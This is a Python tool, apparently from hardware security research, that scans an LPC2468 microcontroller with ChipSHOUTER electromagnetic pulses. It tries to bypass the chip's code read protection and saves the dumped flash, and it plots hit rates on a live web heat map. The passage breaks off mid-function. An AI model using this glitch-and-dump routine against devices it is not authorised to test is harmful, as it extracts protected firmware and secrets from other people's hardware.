#!/usr/bin/env python3
"""
Glitch Heat Map - Spiral scan with glitch testing at each position.
Creates a heat map based on hit rate: 0% = green, 100% = red.

Features:
- Forward or reverse spiral (command line option)
- Voltage optimization: reduces voltage when >50% hit rate until ~50%
- CSV logging: all tests logged to glitch_log.csv
- Hover tooltip: shows coordinates and hit % on web UI

Hit criteria:
- Error 19 = normal (miss)
- No reply = effect/crash (hit)
- 0 = glitched (hit)

Web server at http://localhost:8080 shows real-time heat map.

Usage:
  python3 glitch_heatmap.py           # Forward spiral (0,0) -> center
  python3 glitch_heatmap.py --reverse # Reverse spiral center -> (0,0)
"""
import serial
import time
import threading
import json
import csv
import os
import re
import argparse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import queue

# Parse command line arguments
parser = argparse.ArgumentParser(description='Glitch Heat Map Scanner')
parser.add_argument('--reverse', '-r', action='store_true',
                    help='Reverse spiral: start from center, end at (0,0)')
parser.add_argument('--forward', '-f', action='store_true',
                    help='Forward spiral: start from (0,0), end at center (default)')
parser.add_argument('--start', type=int, nargs=2, default=None, metavar=('X','Y'),
                    help='Bottom-left corner of scan window AND spiral start (e.g. --start 8 9)')
parser.add_argument('--end', type=int, nargs=2, default=None, metavar=('X','Y'),
                    help='Top-right corner of scan window (e.g. --end 12 12)')
parser.add_argument('--start-x', type=int, default=None, help='Starting X position (overrides --start x)')
parser.add_argument('--start-y', type=int, default=None, help='Starting Y position (overrides --start y)')
parser.add_argument('--x-min', type=int, default=None, help='Restrict scan to X >= this (overrides --start x)')
parser.add_argument('--x-max', type=int, default=None, help='Restrict scan to X <= this (overrides --end x)')
parser.add_argument('--y-min', type=int, default=None, help='Restrict scan to Y >= this (overrides --start y)')
parser.add_argument('--y-max', type=int, default=None, help='Restrict scan to Y <= this (overrides --end y)')
parser.add_argument('--trigger-byte', default='0D',
                    help='UART trigger byte in hex (default 0D = CR). E.g. --trigger-byte 39 to fire on "9" in the "19\\r" response')
parser.add_argument('--no-dump', action='store_true',
                    help='Skip full-flash dump on successful glitch (default: dump 504 KB and save to dump_<ts>_x<X>_y<Y>_v<V>.bin)')
parser.add_argument('--dump-size', type=lambda v: int(v, 0), default=0x7E000,
                    help='Bytes to dump on a successful glitch (default 0x7E000 = 504 KB, LPC2468 user flash)')
args = parser.parse_args()

# Determine direction (default is forward)
REVERSE_SPIRAL = args.reverse and not args.forward

# --start/--end fill in both the bounding box and the spiral start point.
# Individual --x-min/--x-max/--y-min/--y-max/--start-x/--start-y still override.
sx, sy = args.start if args.start else (None, None)
ex, ey = args.end   if args.end   else (None, None)

START_X = args.start_x if args.start_x is not None else sx
START_Y = args.start_y if args.start_y is not None else sy
X_MIN   = args.x_min   if args.x_min   is not None else sx
Y_MIN   = args.y_min   if args.y_min   is not None else sy
X_MAX   = args.x_max   if args.x_max   is not None else ex
Y_MAX   = args.y_max   if args.y_max   is not None else ey

# Normalise trigger byte to a "0xXX" form for the Pico CLI
TRIGGER_BYTE_HEX = args.trigger_byte.lower().lstrip('0x').lstrip('0X') or '0'
TRIGGER_BYTE_HEX = f"0x{int(TRIGGER_BYTE_HEX, 16):02X}"

# Grid size
SIZE = 24  # 25x25 grid (0-24)

# Glitch test parameters
SHOTS_PER_POSITION = 15  # Number of glitch attempts per position
TARGET_BAUD = 115200
CRYSTAL_KHZ = 8000
RESET_DELAY = 300

# How many bytes to attempt to dump after a successful glitch (CLI-overridable
# via --dump-size). Default is LPC2468 user-accessible flash = 504 KB; the top
# 8 KB (0x7E000..0x7FFFF) is the reserved boot block and returns rc=14.
FLASH_DUMP_SIZE = args.dump_size

# ChipSHOUTER parameters
CS_VOLTAGE = 500  # Starting voltage in V (ChipSHOUTER max: 500V)
CS_VOLTAGE_MIN = 150  # Minimum voltage (ChipSHOUTER range: 150-500V)
CS_VOLTAGE_STEP = 50  # Voltage reduction step
CS_PULSE_WIDTH = 50  # Pulse width in us

# Current voltage (can be reduced during optimization)
current_voltage = CS_VOLTAGE

# Shared state for web visualization
visited = {}  # (x, y) -> {'hit_rate': 0.0-1.0, 'voltage': V}
current_pos = (0, 0)
update_queue = queue.Queue()
server_ready = threading.Event()

# Progress / ETA tracking — set by main loop, consumed by broadcast_* helpers
total_points = (SIZE + 1) * (SIZE + 1)
scan_start_time = None

# CSV log file
CSV_FILE = f"glitch_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

def init_csv():
    """Initialize CSV log file with headers"""
    with open(CSV_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['timestamp', 'x', 'y', 'voltage', 'pulse_width',
                        'shot_num', 'result', 'hit_rate', 'optimized_voltage'])

def log_test(x, y, voltage, shot_num, result, hit_rate=None, optimized_voltage=None):
    """Log a single test to CSV"""
    with csv_lock:
        with open(CSV_FILE, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                datetime.now().isoformat(),
                x, y, voltage, CS_PULSE_WIDTH,
                shot_num, result,
                f"{hit_rate:.3f}" if hit_rate is not None else "",
                optimized_voltage if optimized_voltage else ""
            ])

HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <title>Glitch Heat Map</title>
    <style>
        body {
            background: #1a1a2e;
            color: #eee;
            font-family: monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        h1 { color: #00ff88; }
        #status {
            margin: 10px 0;
            padding: 10px;
            background: #16213e;
            border-radius: 5px;
        }
        .grids-container {
            display: flex;
            gap: 40px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .grid-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .grid-title {
            color: #00ff88;
            font-size: 16px;
            margin-bottom: 10px;
        }
        .container {
            position: relative;
            display: inline-block;
        }
        canvas {
            border: 2px solid #00ff88;
            background: #0f0f23;
        }
        #tooltip {
            position: fixed;
            background: rgba(0, 0, 0, 0.95);
            color: #fff;
            padding: 8px 12px;
            border-radius: 5px;
            border: 1px solid #00ff88;
            font-size: 14px;
            pointer-events: none;
            display: none;
            z-index: 1000;
            white-space: nowrap;
        }
        #info {
            margin-top: 10px;
            color: #888;
        }
        .legend {
            display: flex;
            align-items: center;
            margin-top: 10px;
            gap: 10px;
        }
        .gradient-hitrate {
            width: 200px;
            height: 20px;
            background: linear-gradient(to right, #00ff00, #ffff00, #ff0000);
            border-radius: 3px;
        }
        .gradient-voltage {
            width: 200px;
            height: 20px;
            background: linear-gradient(to right, #000033, #0066ff, #00ffff, #ffff00, #ff0000);
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <h1>Glitch Heat Map</h1>
    <div id="status">Connecting...</div>

    <div class="grids-container">
        <div class="grid-wrapper">
            <div class="grid-title">Hit Rate</div>
            <div class="container">
                <canvas id="gridHitRate" width="375" height="375"></canvas>
            </div>
            <div class="legend">
                <span>0%</span>
                <div class="gradient-hitrate"></div>
                <span>100%</span>
                <span style="margin-left: 20px; color: #0088ff;">&#9632; GLITCH</span>
            </div>
        </div>

        <div class="grid-wrapper">
            <div class="grid-title">Threshold Voltage</div>
            <div class="container">
                <canvas id="gridVoltage" width="375" height="375"></canvas>
            </div>
            <div class="legend">
                <span>0V</span>
                <div class="gradient-voltage"></div>
                <span>500V</span>
            </div>
        </div>
    </div>

    <div id="tooltip"></div>
    <div id="info">25x25mm grid (15px/cell). Spiral scan pattern. Hover for details.</div>

    <script>
        const canvasHitRate = document.getElementById('gridHitRate');
        const ctxHitRate = canvasHitRate.getContext('2d');
        const canvasVoltage = document.getElementById('gridVoltage');
        const ctxVoltage = canvasVoltage.getContext('2d');
        const status = document.getElementById('status');
        const tooltip = document.getElementById('tooltip');
        const CELL_SIZE = 15;
        const GRID_SIZE = 25;
        const VOLTAGE_MAX = 500;
        let prevPos = null;

        // Store cell data for tooltips
        let cellData = {};  // "x,y" -> {hitRate, voltage, special, threshold}

        function drawGrid(ctx, canvas) {
            ctx.fillStyle = '#0f0f23';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        function hitRateToColor(rate, special) {
            if (special === 'glitch') {
                return '#0088ff';
            }
            let r, g, b;
            if (rate <= 0.5) {
                r = Math.round(255 * (rate * 2));
                g = 255;
                b = 0;
            } else {
                r = 255;
                g = Math.round(255 * (1 - (rate - 0.5) * 2));
                b = 0;
            }
            return `rgb(${r}, ${g}, ${b})`;
        }

        function voltageToColor(voltage) {
            // 0V = dark blue (#000033), 500V = red (#ff0000)
            if (voltage <= 0) {
                return '#000033';
            }
            const ratio = Math.min(voltage / VOLTAGE_MAX, 1.0);
            let r, g, b;
            if (ratio <= 0.25) {
                const t = ratio / 0.25;
                r = 0;
                g = Math.round(102 * t);
                b = Math.round(51 + 204 * t);
            } else if (ratio <= 0.5) {
                const t = (ratio - 0.25) / 0.25;
                r = 0;
                g = Math.round(102 + 153 * t);
                b = 255;
            } else if (ratio <= 0.75) {
                const t = (ratio - 0.5) / 0.25;
                r = Math.round(255 * t);
                g = 255;
                b = Math.round(255 * (1 - t));
            } else {
                const t = (ratio - 0.75) / 0.25;
                r = 255;
                g = Math.round(255 * (1 - t));
                b = 0;
            }
            return `rgb(${r}, ${g}, ${b})`;
        }

        function drawCellHitRate(x, y, hitRate, special) {
            const canvasY = y * CELL_SIZE;
            const canvasX = x * CELL_SIZE;
            ctxHitRate.fillStyle = hitRateToColor(hitRate, special);
            ctxHitRate.fillRect(canvasX + 1, canvasY + 1, CELL_SIZE - 2, CELL_SIZE - 2);
        }

        function drawCellVoltage(x, y, voltage) {
            const canvasY = y * CELL_SIZE;
            const canvasX = x * CELL_SIZE;
            ctxVoltage.fillStyle = voltageToColor(voltage);
            ctxVoltage.fillRect(canvasX + 1, canvasY + 1, CELL_SIZE - 2, CELL_SIZE - 2);
        }

        function drawCell(x, y, hitRate, special, threshold, voltage) {
            drawCellHitRate(x, y, hitRate, special);
            const displayVoltage = hitRate > 0 ? (threshold || voltage) : 0;
            drawCellVoltage(x, y, displayVoltage);
        }

        function drawCurrent(x, y) {
            const canvasY = y * CELL_SIZE;
            const canvasX = x * CELL_SIZE;
            // Draw on both canvases
            ctxHitRate.strokeStyle = '#ffffff';
            ctxHitRate.lineWidth = 2;
            ctxHitRate.strokeRect(canvasX + 1, canvasY + 1, CELL_SIZE - 2, CELL_SIZE - 2);
            ctxVoltage.strokeStyle = '#ffffff';
            ctxVoltage.lineWidth = 2;
            ctxVoltage.strokeRect(canvasX + 1, canvasY + 1, CELL_SIZE - 2, CELL_SIZE - 2);
        }

        // Tooltip handling for both canvases
        function handleMouseMove(e, canvas) {
            var rect = canvas.getBoundingClientRect();
            var mouseX = e.clientX - rect.left;
            var mouseY = e.clientY - rect.top;

            var cellX = Math.floor(mouseX / CELL_SIZE);
            var cellY = Math.floor(mouseY / CELL_SIZE);

            if (cellX >= 0 && cellX < GRID_SIZE && cellY >= 0 && cellY < GRID_SIZE) {
                var key = cellX + ',' + cellY;
                var cellInfo = cellData[key];

                var tooltipHtml;
                if (cellInfo) {
                    var pct = (cellInfo.hitRate * 100).toFixed(1);
                    var specialText = '';
                    if (cellInfo.special === 'glitch') {
                        specialText = '<br><span style="color:#0088ff">GLITCH!</span>';
                    }
                    var thresholdText = cellInfo.threshold ? '<br>Threshold: ' + cellInfo.threshold + 'V' : '';
                    tooltipHtml = '<b>(' + cellX + ', ' + cellY + ')</b><br>Hit: ' + pct + '%<br>Voltage: ' + cellInfo.voltage + 'V' + thresholdText + specialText;
                } else {
                    tooltipHtml = '<b>(' + cellX + ', ' + cellY + ')</b><br>Not tested';
                }
                tooltip.innerHTML = tooltipHtml;
                tooltip.style.display = 'block';
                tooltip.style.left = (e.clientX + 15) + 'px';
                tooltip.style.top = (e.clientY + 15) + 'px';
            } else {
                tooltip.style.display = 'none';
            }
        }

        canvasHitRate.addEventListener('mousemove', function(e) { handleMouseMove(e, canvasHitRate); });
        canvasVoltage.addEventListener('mousemove', function(e) { handleMouseMove(e, canvasVoltage); });
        canvasHitRate.addEventListener('mouseleave', function() { tooltip.style.display = 'none'; });
        canvasVoltage.addEventListener('mouseleave', function() { tooltip.style.display = 'none'; });

        drawGrid(ctxHitRate, canvasHitRate);
        drawGrid(ctxVoltage, canvasVoltage);

        function fmtDur(sec) {
            if (sec == null || !isFinite(sec)) return '?';
            sec = Math.round(sec);
            if (sec < 60) return sec + 's';
            const m = Math.floor(sec / 60), s = sec % 60;
            if (m < 60) return m + 'm' + (s ? s + 's' : '');
            const h = Math.floor(m / 60), mm = m % 60;
            return h + 'h' + (mm ? mm + 'm' : '');
        }
        function fmtEta(sec) {
            if (sec == null || !isFinite(sec)) return '?';
            const t = new Date(Date.now() + sec * 1000);
            return fmtDur(sec) + ' (~' + t.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + ')';
        }
        function progressSuffix(d) {
            const total = d.total != null ? d.total : '?';
            let s = ' - ' + d.count + ' / ' + total + ' positions';
            if (d.avgSec != null)  s += ' | avg ' + fmtDur(d.avgSec) + '/test';
            if (d.etaSec != null && d.count < (d.total || 0)) s += ' | ETA ' + fmtEta(d.etaSec);
            return s;
        }

        const evtSource = new EventSource('/events');

        evtSource.onopen = function() {
            status.textContent = 'Connected - waiting for tests...';
        };

        evtSource.onmessage = function(event) {
            const data = JSON.parse(event.data);

            if (data.type === 'init') {
                // Wipe any stale JS state from a previous SSE session
                cellData = {};
                prevPos = null;
                drawGrid(ctxHitRate, canvasHitRate);
                drawGrid(ctxVoltage, canvasVoltage);
                Object.entries(data.visited).forEach(([key, info]) => {
                    const [x, y] = key.split(',').map(Number);
                    cellData[key] = info;
                    drawCell(x, y, info.hitRate, info.special, info.threshold, info.voltage);
                });
                if (data.current) {
                    drawCurrent(data.current[0], data.current[1]);
                }
                status.textContent = 'Tested: ' + Object.keys(data.visited).length + ' positions';
            }
            else if (data.type === 'move') {
                if (prevPos) {
                    const key = `${prevPos[0]},${prevPos[1]}`;
                    if (cellData[key]) {
                        drawCell(prevPos[0], prevPos[1], cellData[key].hitRate, cellData[key].special, cellData[key].threshold, cellData[key].voltage);
                    }
                }
                drawCurrent(data.x, data.y);
                prevPos = [data.x, data.y];
                status.textContent = `Testing: (${data.x}, ${data.y}) @ ${data.voltage}V` + progressSuffix(data);
            }
            else if (data.type === 'result') {
                const key = `${data.x},${data.y}`;
                cellData[key] = {hitRate: data.hitRate, voltage: data.voltage, special: data.special, threshold: data.threshold};
                drawCell(data.x, data.y, data.hitRate, data.special, data.threshold, data.voltage);
                drawCurrent(data.x, data.y);
                prevPos = [data.x, data.y];
                const pct = (data.hitRate * 100).toFixed(0);
                let specialMsg = data.special === 'glitch' ? ' [GLITCH!]' : '';
                let optMsg = data.optimized ? ` (optimized from ${data.startVoltage}V)` : '';
                status.textContent = `(${data.x}, ${data.y}): ${pct}% @ ${data.voltage}V${optMsg}${specialMsg}` + progressSuffix(data);
            }
            else if (data.type === 'complete') {
                let total = data.elapsedSec != null ? ' in ' + fmtDur(data.elapsedSec) : '';
                status.textContent = `Complete! Tested ${data.count} positions${total}. Log: ${data.csvFile}`;
                status.style.color = '#00ff88';
            }
        };

        evtSource.onerror = function() {
            status.textContent = 'Connection lost - refresh to reconnect';
            status.style.color = '#ff4444';
        };
    </script>
</body>
</html>
'''

class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode())

        elif self.path == '/events':
            self.send_response(200)
            self.send_header('Content-Type', 'text/event-stream')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Connection', 'keep-alive')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            # Send initial state
            init_data = {
                'type': 'init',
                'visited': {f"{x},{y}": info for (x, y), info in visited.items()},
                'current': current_pos
            }
            self.wfile.write(f"data: {json.dumps(init_data)}\n\n".encode())
            self.wfile.flush()

            try:
                while True:
                    try:
                        update = update_queue.get(timeout=1.0)
                        self.wfile.write(f"data: {json.dumps(update)}\n\n".encode())
                        self.wfile.flush()
                    except queue.Empty:
                        self.wfile.write(": keepalive\n\n".encode())
                        self.wfile.flush()
            except (BrokenPipeError, ConnectionResetError):
                pass

        else:
            self.send_response(404)
            self.end_headers()

def run_server():
    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
    server_ready.set()
    print("Web server running at http://localhost:8080", flush=True)
    server.serve_forever()

def _progress_fields():
    """Common progress/ETA fields included in every broadcast."""
    done = len(visited)
    total = total_points
    fields = {'count': done, 'total': total}
    if scan_start_time is not None and done > 0:
        elapsed = time.time() - scan_start_time
        avg = elapsed / done
        remaining = max(total - done, 0)
        fields['elapsedSec'] = elapsed
        fields['avgSec'] = avg
        fields['etaSec'] = avg * remaining
    return fields

def broadcast_move(x, y, voltage):
    global current_pos
    current_pos = (x, y)
    update = {
        'type': 'move',
        'x': x,
        'y': y,
        'voltage': voltage,
    }
    update.update(_progress_fields())
    update_queue.put(update)

def broadcast_result(x, y, hit_rate, voltage, optimized=False, start_voltage=None, special=None, threshold=None):
    """
    Broadcast result to web UI.
    special: None (normal) or 'glitch' (blue for CRP bypass)
    threshold: voltage at which threshold was found (shown in tooltip)
    """
    global current_pos
    visited[(x, y)] = {'hitRate': hit_rate, 'voltage': voltage, 'special': special, 'threshold': threshold}
    current_pos = (x, y)
    update = {
        'type': 'result',
        'x': x,
        'y': y,
        'hitRate': hit_rate,
        'voltage': voltage,
        'optimized': optimized,
        'startVoltage': start_voltage,
        'special': special,
        'threshold': threshold,
    }
    update.update(_progress_fields())
    update_queue.put(update)

def broadcast_complete():
    update = {
        'type': 'complete',
        'count': len(visited),
        'csvFile': CSV_FILE,
    }
    if scan_start_time is not None:
        update['elapsedSec'] = time.time() - scan_start_time
    update_queue.put(update)

def save_html_snapshot(filename):
    """Save current heatmap state as a standalone HTML file"""
    # Build visited data for embedding in HTML
    visited_json = json.dumps({f"{x},{y}": info for (x, y), info in visited.items()})

    # Create standalone HTML with embedded data
    snapshot_html = HTML_PAGE.replace(
        "const evtSource = new EventSource('/events');",
        f"// Static snapshot - no live updates\n        const staticData = {visited_json};"
    ).replace(
        """evtSource.onopen = function() {
            status.textContent = 'Connected - waiting for tests...';
        };

        evtSource.onmessage = function(event) {
            const data = JSON.parse(event.data);

            if (data.type === 'init') {
                // Wipe any stale JS state from a previous SSE session
                cellData = {};
                prevPos = null;
                drawGrid(ctxHitRate, canvasHitRate);
                drawGrid(ctxVoltage, canvasVoltage);
                Object.entries(data.visited).forEach(([key, info]) => {
                    const [x, y] = key.split(',').map(Number);
                    cellData[key] = info;
                    drawCell(x, y, info.hitRate, info.special, info.threshold, info.voltage);
                });
                if (data.current) {
                    drawCurrent(data.current[0], data.current[1]);
                }
                status.textContent = 'Tested: ' + Object.keys(data.visited).length + ' positions';
            }
            else if (data.type === 'move') {
                if (prevPos) {
                    const key = `${prevPos[0]},${prevPos[1]}`;
                    if (cellData[key]) {
                        drawCell(prevPos[0], prevPos[1], cellData[key].hitRate, cellData[key].special, cellData[key].threshold, cellData[key].voltage);
                    }
                }
                drawCurrent(data.x, data.y);
                prevPos = [data.x, data.y];
                status.textContent = `Testing: (${data.x}, ${data.y}) @ ${data.voltage}V` + progressSuffix(data);
            }
            else if (data.type === 'result') {
                const key = `${data.x},${data.y}`;
                cellData[key] = {hitRate: data.hitRate, voltage: data.voltage, special: data.special, threshold: data.threshold};
                drawCell(data.x, data.y, data.hitRate, data.special, data.threshold, data.voltage);
                drawCurrent(data.x, data.y);
                prevPos = [data.x, data.y];
                const pct = (data.hitRate * 100).toFixed(0);
                let specialMsg = data.special === 'glitch' ? ' [GLITCH!]' : '';
                let optMsg = data.optimized ? ` (optimized from ${data.startVoltage}V)` : '';
                status.textContent = `(${data.x}, ${data.y}): ${pct}% @ ${data.voltage}V${optMsg}${specialMsg}` + progressSuffix(data);
            }
            else if (data.type === 'complete') {
                let total = data.elapsedSec != null ? ' in ' + fmtDur(data.elapsedSec) : '';
                status.textContent = `Complete! Tested ${data.count} positions${total}. Log: ${data.csvFile}`;
                status.style.color = '#00ff88';
            }
        };

        evtSource.onerror = function() {
            status.textContent = 'Connection lost - refresh to reconnect';
            status.style.color = '#ff4444';
        };""",
        f"""// Load static data
        Object.entries(staticData).forEach(([key, info]) => {{
            const [x, y] = key.split(',').map(Number);
            cellData[key] = info;
            drawCell(x, y, info.hitRate, info.special, info.threshold, info.voltage);
        }});
        status.textContent = 'Snapshot: ' + Object.keys(staticData).length + ' positions tested';
        status.style.color = '#00ff88';"""
    )

    with open(filename, 'w') as f:
        f.write(snapshot_html)
    print(f"HTML snapshot saved to: {filename}", flush=True)

# Initialize CSV
init_csv()

# Start web server in background
server_thread = threading.Thread(target=run_server, daemon=True)
server_thread.start()
server_ready.wait()

# Serial connection to Raiden
s = serial.Serial('/dev/ttyACM0', 115200, timeout=5)
time.sleep(1)

def send_cmd(cmd, timeout=5):
    """Send command to Raiden and wait for response"""
    s.write((cmd + '\r\n').encode())
    time.sleep(0.1)
    response = ""
    start = time.time()
    while time.time() - start < timeout:
        if s.in_waiting:
            response += s.read(s.in_waiting).decode('utf-8', errors='ignore')
            if 'OK:' in response or 'ERROR:' in response or '> ' in response:
                break
        time.sleep(0.05)
    return response

def send_raw(cmd):
    """Send command without waiting for structured response"""
    s.write((cmd + '\r\n').encode())
    time.sleep(0.1)

def read_until_prompt(timeout=3):
    """Read until we see the prompt"""
    response = ""
    start = time.time()
    while time.time() - start < timeout:
        if s.in_waiting:
            chunk = s.read(s.in_waiting).decode('utf-8', errors='ignore')
            response += chunk
            if '> ' in chunk:
                break
        time.sleep(0.05)
    return response

def grbl_move(x, y):
    """Move XY platform to position"""
    resp = send_cmd(f'grbl move {x} {y}', timeout=35)
    if 'ERROR' in resp:
        print(f"  Move ERROR: {resp}", flush=True)
        return False
    return True

def set_chipshouter_voltage(voltage):
    """Set ChipSHOUTER voltage and ensure CS is ready"""
    global current_voltage
    send_cmd(f"CS VOLTAGE {voltage}")
    current_voltage = voltage
    time.sleep(0.5)  # Wait for voltage to settle
    ensure_cs_ready()  # Make sure CS is armed and ready

def get_cs_status():
    """Get ChipSHOUTER status"""
    s.read(s.in_waiting)  # Clear buffer
    s.write(b"CS STATUS\r\n")
    time.sleep(0.2)
    response = s.read(s.in_waiting).decode('utf-8', errors='ignore').lower()
    return response

def ensure_cs_ready():
    """Ensure CS is armed and ready. Reset if fault, re-arm if disarmed. Returns True if OK."""
    resp = get_cs_status()

    # Check for fault state - must reset
    if 'fault' in resp:
        print(" [FAULT-RESET]", end='', flush=True)
        send_cmd("CS RESET")
        time.sleep(1.0)
        # Wait for reset to complete (disarmed state)
        for _ in range(50):
            resp = get_cs_status()
            if 'disarmed' in resp and 'fault' not in resp:
                break
            time.sleep(0.1)
        # Set voltage after reset
        send_cmd(f"CS VOLTAGE {current_voltage}")
        time.sleep(0.2)
        send_cmd(f"CS PULSE {CS_PULSE_WIDTH}")
        send_cmd("CS TRIGGER HW HIGH")
        resp = get_cs_status()

    # If disarmed, arm it
    if 'disarmed' in resp:
        send_cmd("CS ARM")
        time.sleep(0.3)
        # Wait for armed state
        for _ in range(50):
            resp = get_cs_status()
            if 'armed' in resp and 'disarmed' not in resp and 'fault' not in resp:
                break
            time.sleep(0.1)

    # Final verify
    resp = get_cs_status()
    return 'armed' in resp and 'disarmed' not in resp and 'fault' not in resp

def check_and_reset_chipshouter():
    """Legacy wrapper - use ensure_cs_ready instead"""
    return ensure_cs_ready()

_HEX_LINE_RE = re.compile(r'^0x([0-9A-F]{8}):\s+((?:[0-9A-F]{2} ){1,16})')


def run_glitch_test(x, y, voltage):
    """
    Single armed-read shot via the native TARGET BL READ command.

    By default, every shot attempts a *full* flash dump (FLASH_DUMP_SIZE
    bytes). The trigger fires on the LPC echoing the \\r at the end of our
    R command (PIO trigger on Pico GP5 = LPC UART TX). If the glitch lands
    during the LPC's CRP check, the LPC returns rc=0 and streams the entire
    requested range; we save the dump immediately because that bypass may
    not be reproducible on the very next attempt.

    If --no-dump is set, we issue a cheap 4-byte read instead and never
    save anything — useful for sweep/heatmap discovery scans.

    Returns: 'normal'   (CRP active, rc=19)
             'glitch'   (read succeeded — CRP bypassed; dump saved if enabled)
             'effect'   (no/garbled reply — target perturbed but no bypass)
             'cs_error' (ChipSHOUTER fault)
    """
    if not check_and_reset_chipshouter():
        return 'cs_error'

    # Setup trigger and arm
    send_cmd(f"TRIGGER UART {TRIGGER_BYTE_HEX}")
    send_cmd("SET PAUSE 5000")
    send_cmd("SET WIDTH 150")
    send_cmd("SET COUNT 1")
    send_cmd("ARM ON")

    # Pick read size based on mode.
    if args.no_dump:
        read_bytes = 4
        idle_limit = 1.5          # cheap mode — small reply
        deadline_after = 5
    else:
        read_bytes = FLASH_DUMP_SIZE
        idle_limit = 15.0         # 30-line group at 11.5 KB/s ≈ 0.5 s; plenty
        deadline_after = 240      # 504 KB at ~5.5 KB/s ≈ 90 s; allow slack

    # Issue the read — trigger fires on the echoed \r byte
    send_raw(f"TARGET BL READ 0 {read_bytes}")

    dump_bytes = bytearray()
    line_buf = ""
    saw_rc19 = False
    saw_other_error = False
    saw_ok_marker = False
    last_data = time.time()
    deadline = time.time() + deadline_after

    while time.time() < deadline:
        if s.in_waiting:
            chunk = s.read(s.in_waiting).decode('utf-8', errors='replace')
            line_buf += chunk
            last_data = time.time()
            parts = line_buf.split('\n')
            line_buf = parts[-1]
            for ln in parts[:-1]:
                ln = ln.rstrip('\r')
                m = _HEX_LINE_RE.match(ln)
                if m:
                    for b in m.group(2).strip().split():
                        dump_bytes.append(int(b, 16))
                elif "CODE_READ_PROTECTION_ENABLED" in ln or "rc=19" in ln:
                    saw_rc19 = True
                elif "OK: Read" in ln:
                    saw_ok_marker = True
                elif "ERROR" in ln:
                    saw_other_error = True
            if saw_ok_marker or saw_rc19:
                break
        elif time.time() - last_data > idle_limit:
            break
        else:
            time.sleep(0.05)

    # Classify
    if saw_rc19:
        return 'normal'

    if saw_ok_marker and len(dump_bytes) > 0:
        # A successful glitch yielded real flash data. Save it now — the
        # bypass might not repeat on a second attempt.
        if not args.no_dump:
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            dump_path = f"dump_{ts}_x{x}_y{y}_v{voltage}.bin"
            with open(dump_path, 'wb') as f:
                f.write(dump_bytes)
            print(f"\n  [GLITCH @ ({x},{y}) {voltage}V — "
                  f"saved {len(dump_bytes)} bytes to {dump_path}]",
                  flush=True)
            log_test(x, y, voltage, 0, 'dump_saved',
                     hit_rate=None, optimized_voltage=None)
        return 'glitch'

    if saw_other_error or not dump_bytes:
        return 'effect'

    # Got some hex but no terminator — partial dump, treat as effect
    return 'effect'

def sync_target():
    """Sync with target ISP bootloader"""
    send_cmd("TARGET LPC")
    send_raw(f"TARGET SYNC {TARGET_BAUD} {CRYSTAL_KHZ} {RESET_DELAY}")

    response = ""
    start = time.time()
    while time.time() - start < 5:
        if s.in_waiting:
            chunk = s.read(s.in_waiting).decode('utf-8', errors='ignore')
            response += chunk
            if "LPC ISP sync complete" in response:
                return True
            if "> " in chunk:
                break
        time.sleep(0.1)
    return False

def test_position(x, y, voltage, shots=SHOTS_PER_POSITION):
    """
    Run multiple glitch tests at current position.
    Returns: (hit_rate, completed_count, glitch_found)
    """
    hits = 0
    completed = 0
    retries = 0
    max_retries = 3
    glitch_found = False

    while completed < shots:
        # Sync with target before each test
        if not sync_target():
            print(f"S", end='', flush=True)  # S = sync failed
            log_test(x, y, voltage, completed + 1, 'sync_fail')
            hits += 1
            completed += 1
            continue

        result = run_glitch_test(x, y, voltage)

        if result == 'cs_error':
            # ChipSHOUTER error - retry this shot (don't count)
            retries += 1
            print("R", end='', flush=True)  # R = retry
            log_test(x, y, voltage, completed + 1, 'cs_error')
            if retries > max_retries:
                print("\n  [Too many CS errors, skipping]", flush=True)
                break
            continue

        retries = 0  # Reset retry counter on success
        completed += 1

        # Log the test result
        log_test(x, y, voltage, completed, result)

        if result == 'effect' or result == 'glitch':
            hits += 1
            if result == 'glitch':
                # The dump (if any) was already saved inside run_glitch_test —
                # the bypass shot IS the dump attempt, so a second-try dump
                # would risk losing the only successful capture.
                glitch_found = True
                print("+", end='', flush=True)
            else:
                print("!", end='', flush=True)
        else:
            print(".", end='', flush=True)

        time.sleep(0.2)

    hit_rate = hits / max(completed, 1)
    return hit_rate, completed, glitch_found

def optimize_voltage(x, y, initial_hit_rate, initial_glitch):
    """
    Reduce voltage until hit rate drops to ~50%.
    If hit rate drops from high to 0%, fine-tune with binary search.

    Returns: (final_hit_rate, final_voltage, was_optimized, special, threshold_voltage)
    special: None or 'glitch' (for CRP bypass)
    threshold_voltage: voltage at which threshold was found (or None)
    """
    global current_voltage

    if initial_hit_rate <= 0.5:
        # Already at or below 50% - can't optimize further
        special = 'glitch' if initial_glitch else None
        return initial_hit_rate, current_voltage, False, special, None

    start_voltage = current_voltage
    prev_voltage = current_voltage
    prev_hit_rate = initial_hit_rate
    glitch_found = initial_glitch

    print(f"\n    Optimizing voltage (starting at {current_voltage}V, {initial_hit_rate*100:.0f}%)", flush=True)

    while current_voltage > CS_VOLTAGE_MIN:
        # Reduce voltage by one step
        new_voltage = current_voltage - CS_VOLTAGE_STEP
        if new_voltage < CS_VOLTAGE_MIN:
            new_voltage = CS_VOLTAGE_MIN

        print(f"    Trying {new_voltage}V: ", end='', flush=True)
        set_chipshouter_voltage(new_voltage)

        # Test at new voltage (fewer shots for optimization)
        hit_rate, _, glitch = test_position(x, y, new_voltage, shots=10)
        if glitch:
            glitch_found = True

        print(f" = {hit_rate*100:.0f}%", flush=True)

        # Check for sharp drop (high -> 0%)
